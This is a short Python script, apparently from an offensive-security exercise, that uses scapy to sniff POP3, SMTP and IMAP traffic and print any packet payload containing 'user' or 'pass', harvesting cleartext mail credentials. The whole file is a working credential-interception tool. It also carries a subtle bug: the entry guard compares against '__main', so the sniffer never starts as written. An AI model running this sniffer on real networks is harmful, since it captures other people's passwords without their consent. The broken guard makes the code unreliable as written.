from scapy.layers.inet import TCP, IP
from scapy.sendrecv import sniff

def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        # 檢查封包 payload 中有沒有 USER 和 PASS 兩條郵件協議命令
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # will not be stored in memory
    sniff(filter = 'tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)

if __name__ == '__main':
    main()